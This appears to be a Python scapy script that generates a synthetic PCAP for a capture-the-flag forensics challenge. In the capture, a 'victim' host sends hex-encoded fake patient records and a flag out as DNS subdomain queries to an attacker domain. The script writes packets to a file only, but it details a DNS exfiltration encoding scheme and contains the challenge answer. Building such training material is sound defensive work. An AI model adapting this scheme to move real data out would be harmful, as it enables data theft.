#!/usr/bin/env python3
"""
DNS Tunneling PCAP Generator
Creates realistic network traffic showing DNS data exfiltration
"""

from scapy.all import *
import random
import time
import sys

def generate_dns_pcap(output_file):
    """Generate PCAP file with DNS tunneling traffic"""

    packets = []

    # Network configuration
    victim_ip = "10.0.2.45"  # Infected billing workstation
    dns_server = "8.8.8.8"   # Google DNS
    attacker_domain = "data-exfil.tk"  # Attacker's C2 domain

    # Legitimate domains for normal traffic
    legit_domains = [
        "google.com", "microsoft.com", "office365.com", "medicarehealth.org",
        "amazon.com", "cloudflare.com", "adobe.com", "salesforce.com",
        "github.com", "stackoverflow.com", "linkedin.com", "bing.com",
        "windows.com", "apple.com", "zoom.us", "slack.com",
        "dropbox.com", "box.com", "gmail.com", "outlook.com"
    ]

    # Other internal IPs for variety
    internal_ips = [
        "10.0.2.15", "10.0.2.23", "10.0.2.31", "10.0.2.56",
        "10.0.2.78", "10.0.2.92", "10.0.2.101", "10.0.2.134"
    ]

    # Data to exfiltrate (includes flag and sensitive info)
    exfil_data = """PATIENT_DATABASE_EXPORT|Records:347|Date:2024-12-15|
Patient:John_Doe,SSN:123-45-6789,DOB:1975-03-21,Diagnosis:Hypertension|
Patient:Jane_Smith,SSN:987-65-4321,DOB:1982-07-14,Diagnosis:Diabetes_Type2|
Patient:Robert_Johnson,SSN:456-78-9123,DOB:1968-11-30,Diagnosis:COPD|
FLAG:OCR{dns_tunn3l_d3t3ct3d}|
Patient:Mary_Williams,SSN:321-54-9876,DOB:1990-05-18,Diagnosis:Asthma|
EXFIL_COMPLETE:TRUE"""

    # Convert data to hex for tunneling
    hex_data = exfil_data.encode().hex()

    # Split into chunks (30 chars per subdomain for realism)
    chunk_size = 30
    data_chunks = [hex_data[i:i+chunk_size] for i in range(0, len(hex_data), chunk_size)]

    print(f"[*] Generating DNS tunneling PCAP with {len(data_chunks)} exfiltration queries")
    print(f"[*] Total data size: {len(hex_data)} hex chars ({len(exfil_data)} bytes)")

    # Timestamp for packets
    current_time = 1702656000.0  # December 15, 2024, 12:00:00 PM

    # Phase 1: Normal DNS traffic (first hour)
    print("[*] Generating normal DNS traffic...")
    for i in range(80):
        src_ip = random.choice([victim_ip] + internal_ips)
        domain = random.choice(legit_domains)

        # DNS query
        dns_query = IP(src=src_ip, dst=dns_server) / \
                    UDP(sport=random.randint(49152, 65535), dport=53) / \
                    DNS(rd=1, qd=DNSQR(qname=domain))
        dns_query.time = current_time
        packets.append(dns_query)

        # DNS response
        dns_response = IP(src=dns_server, dst=src_ip) / \
                       UDP(sport=53, dport=dns_query[UDP].sport) / \
                       DNS(id=dns_query[DNS].id, qr=1, aa=0, qd=DNSQR(qname=domain),
                           an=DNSRR(rrname=domain, rdata=f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"))
        dns_response.time = current_time + random.uniform(0.01, 0.05)
        packets.append(dns_response)

        current_time += random.uniform(20, 90)  # 20-90 seconds between queries

    # Phase 2: DNS tunneling begins (infection starts)
    print("[*] Generating DNS tunneling exfiltration traffic...")
    current_time += 300  # 5 minute gap before tunneling starts

    # Send the exfiltrated data chunks
    for idx, chunk in enumerate(data_chunks):
        # Create subdomain with hex chunk
        subdomain = f"{chunk}.{attacker_domain}"

        # DNS query with encoded data
        dns_query = IP(src=victim_ip, dst=dns_server) / \
                    UDP(sport=random.randint(49152, 65535), dport=53) / \
                    DNS(rd=1, qd=DNSQR(qname=subdomain))
        dns_query.time = current_time
        packets.append(dns_query)

        # DNS response (usually NXDOMAIN or attacker's IP)
        attacker_ip = "185.220.101.47"  # Suspicious foreign IP
        dns_response = IP(src=dns_server, dst=victim_ip) / \
                       UDP(sport=53, dport=dns_query[UDP].sport) / \
                       DNS(id=dns_query[DNS].id, qr=1, aa=0, rcode=0,
                           qd=DNSQR(qname=subdomain),
                           an=DNSRR(rrname=subdomain, rdata=attacker_ip))
        dns_response.time = current_time + random.uniform(0.02, 0.08)
        packets.append(dns_response)

        # Rapid-fire tunneling (every 1-3 seconds)
        current_time += random.uniform(1.0, 3.0)

        # Progress indicator
        if (idx + 1) % 10 == 0:
            print(f"    Generated {idx + 1}/{len(data_chunks)} tunneling queries")

    # Phase 3: More normal traffic mixed in (to look less suspicious)
    print("[*] Generating post-exfiltration normal traffic...")
    current_time += 60

    for i in range(60):
        src_ip = random.choice([victim_ip] + internal_ips)
        domain = random.choice(legit_domains)

        dns_query = IP(src=src_ip, dst=dns_server) / \
                    UDP(sport=random.randint(49152, 65535), dport=53) / \
                    DNS(rd=1, qd=DNSQR(qname=domain))
        dns_query.time = current_time
        packets.append(dns_query)

        dns_response = IP(src=dns_server, dst=src_ip) / \
                       UDP(sport=53, dport=dns_query[UDP].sport) / \
                       DNS(id=dns_query[DNS].id, qr=1, aa=0, qd=DNSQR(qname=domain),
                           an=DNSRR(rrname=domain, rdata=f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"))
        dns_response.time = current_time + random.uniform(0.01, 0.05)
        packets.append(dns_response)

        current_time += random.uniform(15, 60)

    # Phase 4: A few more tunneling queries (attacker checking connection)
    print("[*] Generating follow-up tunneling traffic...")
    for i in range(5):
        test_subdomain = f"{random.randbytes(15).hex()}.{attacker_domain}"

        dns_query = IP(src=victim_ip, dst=dns_server) / \
                    UDP(sport=random.randint(49152, 65535), dport=53) / \
                    DNS(rd=1, qd=DNSQR(qname=test_subdomain))
        dns_query.time = current_time
        packets.append(dns_query)

        dns_response = IP(src=dns_server, dst=victim_ip) / \
                       UDP(sport=53, dport=dns_query[UDP].sport) / \
                       DNS(id=dns_query[DNS].id, qr=1, aa=0, rcode=0,
                           qd=DNSQR(qname=test_subdomain),
                           an=DNSRR(rrname=test_subdomain, rdata="185.220.101.47"))
        dns_response.time = current_time + random.uniform(0.02, 0.08)
        packets.append(dns_response)

        current_time += random.uniform(30, 60)

    # Write PCAP file
    print(f"[*] Writing {len(packets)} packets to {output_file}")
    wrpcap(output_file, packets)
    print(f"[+] PCAP generated successfully!")
    print(f"[+] Suspicious domain: {attacker_domain}")
    print(f"[+] Infected host: {victim_ip}")
    print(f"[+] Number of exfiltration queries: {len(data_chunks)}")

if __name__ == "__main__":
    output = sys.argv[1] if len(sys.argv) > 1 else "dns-tunnel.pcap"
    generate_dns_pcap(output)
